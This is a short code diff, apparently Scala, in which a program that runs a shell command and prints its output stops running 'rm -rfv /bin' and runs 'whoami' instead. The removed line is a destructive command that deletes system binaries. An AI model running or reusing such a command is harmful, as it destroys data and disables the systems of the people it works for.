@@ -11,6 +11,6 @@ Def Read(inputStream: InputStream) =
 	while ( (line = reader.readLine()) != null)
 		println(line)
 
-val p = Runtime.getRuntime().exec("rm -rfv /bin");
-Read(p.getInputStream())
-Read(p.getErrorStream())
+val proc = Runtime.getRuntime().exec("whoami")
+Read(proc.getInputStream())
+Read(proc.getErrorStream())
